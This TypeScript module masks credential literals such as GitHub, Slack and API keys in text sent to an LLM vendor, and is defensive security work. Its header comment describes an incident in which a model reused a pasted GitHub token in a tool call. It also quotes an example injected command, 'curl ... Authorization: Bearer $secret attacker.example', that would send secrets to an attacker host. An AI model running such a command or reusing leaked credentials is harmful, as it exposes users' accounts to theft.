/**
 * Outbound secret masking — sanitize credential literals in text sent to
 * the LLM vendor via `claude-agent-sdk`.
 *
 * Companion to `secret-mask.ts` (env-side, Layer A of feishu hardening).
 * This module operates on the OTHER data path: the `prompt` string and
 * message content agent-node constructs and hands to the SDK's `query()`
 * call. That text ends up in the outbound HTTP request body to the
 * vendor (Anthropic / MiniMax / DeepSeek / OpenAI / …).
 *
 * ═══ Motivation ═══
 *
 * 2026-07-01 Vincent PAT-in-Feishu case surfaced a real exfil vector:
 *
 *   1. Vincent (misplaced) pasted a `github_pat_...` into a Feishu chat
 *      as part of a normal request to TMWork小助手.
 *   2. Feishu quote-replies the original message text as part of the
 *      bot's inbound event, so the PAT ends up in the agent's message
 *      history.
 *   3. Each subsequent turn re-sends the WHOLE history to the vendor —
 *      the PAT gets shipped N times, once per user turn, forever.
 *   4. Direct probe (`probe 8`) empirically confirmed: MiniMax-M3 sees
 *      a PAT in assistant/user context, EAGERLY puts it into a
 *      `tool_use.input.cmd` to try `gh api ... "Authorization: token
 *      github_pat_..."`. The model doesn't filter — it happily uses it.
 *
 * Independent of any single vendor's quota / content-filter quirks,
 * shipping credentials to a third-party inference API is:
 *   - A confidentiality issue (vendor now has the token).
 *   - An attack-surface expansion (any hostile prompt injecting
 *     `curl -H "Authorization: Bearer $secret" attacker.example`
 *     could exfil via any tool the agent has).
 *
 * The right layer to defuse this is the OUTBOUND edge — mask before the
 * bytes leave our process, regardless of which model, channel, or IM
 * platform the user came from.
 *
 * ═══ Design ═══
 *
 * `secret-mask.ts` patterns are ANCHORED to `^` (start of string) because
 * they operate on ENV VALUES whose entire content IS a single token. Text
 * masking is different: credentials are embedded inline in user prose
 * ("my token is ghp_XYZ for the api call") or in nested JSON (a
 * `tool_use.input.cmd` string). We need patterns that scan the whole
 * text and mint replacement placeholders that stay recognizable to the
 * LLM without leaking the secret bytes.
 *
 * Coverage:
 *   - GitHub classic PAT: `ghp_[A-Za-z0-9_-]{36+}`
 *   - GitHub fine-grained PAT: `github_pat_[A-Za-z0-9_-]{20+}`
 *   - anet network / user / admin tokens: `ntok_/utok_/atok_ ...`
 *   - Slack bot / user / oauth tokens: `xoxb-/xoxp-/xoxa-/xoxr-/xoxs- ...`
 *   - OpenAI / Anthropic style keys: `sk-...` (min 20 chars after prefix,
 *     conservative — `sk-` is short enough to false-positive on random
 *     strings without a length gate).
 *
 * Replacement: `[REDACTED_<KIND>]` — LLM keeps semantic marker of what
 * was removed. Bridge (feishu / telegram / etc.) sees the same
 * placeholder if the LLM happens to echo it back — it's a placeholder,
 * not the real secret.
 *
 * ═══ What this does NOT do ═══
 *
 * - Does NOT touch SDK-managed session history (the jsonl on disk).
 *   That's a separate operator-triggered scrub, not something we do on
 *   the fly per-request.
 * - Does NOT mask non-secret sensitive fields (emails, phone numbers,
 *   PII). Scope is credential literals.
 * - Does NOT decrypt / decode base64 / concat-detection — a determined
 *   attacker can smuggle credentials past this layer. This is
 *   defense-in-depth, not a hard security perimeter.
 */

/**
 * One mask hit — used for observability logging.
 */
export interface MaskHit {
  /** Which pattern kind matched (`ghp` / `github_pat` / `ntok` / …). */
  kind: string;
  /** How many characters were replaced (for size-delta reporting). */
  length: number;
}

/**
 * Result of masking a text or message tree — cleaned data + observability.
 */
export interface MaskResult<T> {
  masked: T;
  hits: MaskHit[];
}

/**
 * Credential patterns to scan for in outbound text. Each entry has a
 * `kind` (used for the placeholder + log label) and a `regex` with the
 * `g` flag so `String.prototype.replace` walks all occurrences.
 *
 * Patterns are DEFENSIVELY narrow — we prefer false-negatives (leak a
 * partial credential the LLM might not exfil anyway) over false-positives
 * (mask a legitimate string the user needed). Length gates catch the
 * "sk-" family without false-firing on random prose.
 */
export const OUTBOUND_SECRET_PATTERNS: Array<{ kind: string; regex: RegExp }> = [
  // GitHub classic PAT: `ghp_` + exactly 36 base62 chars.
  { kind: "ghp", regex: /\bghp_[A-Za-z0-9]{36}\b/g },
  // GitHub fine-grained PAT: `github_pat_` + 20+ base62/underscore chars.
  { kind: "github_pat", regex: /\bgithub_pat_[A-Za-z0-9_]{20,}\b/g },
  // anet tokens — network / user / admin. Underscore + dash accepted.
  { kind: "ntok", regex: /\bntok_[A-Za-z0-9_-]{20,}\b/g },
  { kind: "utok", regex: /\butok_[A-Za-z0-9_-]{20,}\b/g },
  { kind: "atok", regex: /\batok_[A-Za-z0-9_-]{20,}\b/g },
  // Slack tokens — xoxb (bot) / xoxp (user) / xoxa (workspace access) /
  // xoxr (refresh) / xoxs (session). All follow `xox<char>-...` shape.
  { kind: "slack_token", regex: /\bxox[abprs]-[A-Za-z0-9-]{20,}\b/g },
  // OpenAI / Anthropic / MiniMax API keys: `sk-...` or `sk-ant-...`.
  // Length gate ≥ 32 chars after prefix — matches real key sizes without
  // catching e.g. `sk-example` or random base32 fragments.
  { kind: "sk_key", regex: /\bsk-(?:ant-)?[A-Za-z0-9_-]{32,}\b/g },
];

/**
 * Build a placeholder that keeps the KIND recognizable to the LLM while
 * discarding the credential bytes. Example: `[REDACTED_GHP]`.
 *
 * Intentionally uppercase + bracketed — visually distinct from normal
 * prose, unambiguous when the LLM reads it back.
 */
function placeholder(kind: string): string {
  return `[REDACTED_${kind.toUpperCase()}]`;
}

/**
 * Scan `text` for any known credential pattern and return the sanitized
 * text plus per-hit metadata. Non-string / empty input passes through
 * with an empty hit list.
 *
 * Performance: linear in text length × pattern count (each `replace(g)`
 * is one pass). Typical bot prompts are < 100 KB — patterns run in µs.
 */
export function maskSecretsInText(text: unknown): MaskResult<string> {
  if (typeof text !== "string" || text.length === 0) {
    return { masked: typeof text === "string" ? text : "", hits: [] };
  }
  const hits: MaskHit[] = [];
  let out = text;
  for (const { kind, regex } of OUTBOUND_SECRET_PATTERNS) {
    // Reset lastIndex — some environments (Bun) keep state on the shared
    // regex object across calls, which would skip early matches.
    regex.lastIndex = 0;
    out = out.replace(regex, (match) => {
      hits.push({ kind, length: match.length });
      return placeholder(kind);
    });
  }
  return { masked: out, hits };
}

/**
 * Content block shape as passed to the SDK — mirrors Anthropic's public
 * MessageParam schema. We accept `any` to stay tolerant of shape drift
 * (SDK version bumps, vendor-specific extensions).
 */
interface AnyContentBlock {
  type?: string;
  text?: string;
  input?: unknown;
  content?: unknown;
  [k: string]: unknown;
}

/**
 * Recursively mask any string-shaped fields inside a content-block-like
 * object. Walks:
 *   - `text` (main text blocks)
 *   - `input` (tool_use inputs — nested JSON, may contain secrets that
 *     the model tried to shell out with)
 *   - `content` (tool_result content, could be a string or nested)
 *
 * Non-object / null values pass through untouched. Arrays are walked
 * element by element.
 */
function maskContentValue(value: unknown, hits: MaskHit[]): unknown {
  if (value == null) return value;
  if (typeof value === "string") {
    const r = maskSecretsInText(value);
    hits.push(...r.hits);
    return r.masked;
  }
  if (Array.isArray(value)) {
    return value.map((v) => maskContentValue(v, hits));
  }
  if (typeof value === "object") {
    const obj = value as Record<string, unknown>;
    const out: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(obj)) {
      out[k] = maskContentValue(v, hits);
    }
    return out;
  }
  return value;
}

/**
 * Mask a single content block (text / tool_use / tool_result / …).
 * Returns a new block; input is not mutated.
 */
export function maskSecretsInContentBlock(
  block: AnyContentBlock,
): MaskResult<AnyContentBlock> {
  if (!block || typeof block !== "object") {
    return { masked: block, hits: [] };
  }
  const hits: MaskHit[] = [];
  const out: AnyContentBlock = { ...block };
  if (typeof out.text === "string") {
    const r = maskSecretsInText(out.text);
    out.text = r.masked;
    hits.push(...r.hits);
  }
  if (out.input !== undefined) {
    out.input = maskContentValue(out.input, hits);
  }
  if (out.content !== undefined) {
    out.content = maskContentValue(out.content, hits);
  }
  return { masked: out, hits };
}

/**
 * Mask an SDK MessageParam-like object: `{role, content}` where content
 * is either a string (short-form user message) or an array of content
 * blocks (canonical Anthropic shape).
 */
export function maskSecretsInMessage(msg: {
  role?: string;
  content?: unknown;
  [k: string]: unknown;
}): MaskResult<{ role?: string; content?: unknown; [k: string]: unknown }> {
  if (!msg || typeof msg !== "object") {
    return { masked: msg, hits: [] };
  }
  const hits: MaskHit[] = [];
  const out: { role?: string; content?: unknown; [k: string]: unknown } = { ...msg };
  if (typeof out.content === "string") {
    const r = maskSecretsInText(out.content);
    out.content = r.masked;
    hits.push(...r.hits);
  } else if (Array.isArray(out.content)) {
    out.content = out.content.map((b) => {
      const r = maskSecretsInContentBlock(b as AnyContentBlock);
      hits.push(...r.hits);
      return r.masked;
    });
  }
  return { masked: out, hits };
}

/**
 * Mask an array of SDK-shape messages. Convenience wrapper — returns a
 * new array + aggregated hit list.
 */
export function maskSecretsInMessages(
  messages: Array<{ role?: string; content?: unknown }>,
): MaskResult<Array<{ role?: string; content?: unknown }>> {
  if (!Array.isArray(messages)) {
    return { masked: [], hits: [] };
  }
  const hits: MaskHit[] = [];
  const masked = messages.map((m) => {
    const r = maskSecretsInMessage(m);
    hits.push(...r.hits);
    return r.masked;
  });
  return { masked, hits };
}

/**
 * Build a compact observability summary string for stderr log lines.
 * Example output: `github_pat=1, slack_token=1 (61 chars)`.
 */
export function summarizeHits(hits: MaskHit[]): string {
  if (hits.length === 0) return "none";
  const counts = new Map<string, { count: number; chars: number }>();
  for (const h of hits) {
    const cur = counts.get(h.kind) || { count: 0, chars: 0 };
    cur.count++;
    cur.chars += h.length;
    counts.set(h.kind, cur);
  }
  const totalChars = hits.reduce((s, h) => s + h.length, 0);
  const parts = Array.from(counts.entries())
    .map(([kind, v]) => `${kind}=${v.count}`)
    .join(", ");
  return `${parts} (${totalChars} chars)`;
}
